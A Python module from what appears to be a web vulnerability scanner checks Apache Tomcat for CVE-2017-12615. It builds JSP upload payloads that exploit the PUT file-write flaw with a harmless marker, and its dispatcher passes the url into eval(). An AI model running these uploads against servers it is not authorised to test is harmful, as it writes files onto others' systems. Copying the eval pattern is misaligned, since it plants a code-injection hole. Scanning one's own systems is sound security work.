#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    ApacheTomcat扫描类: 
        Tomcat PUT方法任意文件写入漏洞
            CVE-2017-12615
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_int_2
from lib.tool.thread import thread
from payloads.ApacheTomcat.cve_2017_12615 import cve_2017_12615_scan

class Tomcat():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'ApacheTomcat'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.random_num_1, self.random_num_2 = random_int_2(5)

        self.cve_2017_12615_payloads = [
            {
                'path': '{}.jsp/'.format(self.random_num_1),
                'data': '<% out.println("<h1>{}</h1>"); %>'.format(self.random_num_2)
            },
            {
                'path': '{}.jsp'.format(self.random_num_1),
                'data': '<% out.println("<h1>{}</h1>"); %>'.format(self.random_num_2)
            }
        ]

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2017_12615_scan, url=url),
        ]

Tomcat.cve_2017_12615_scan = cve_2017_12615_scan

tomcat = Tomcat()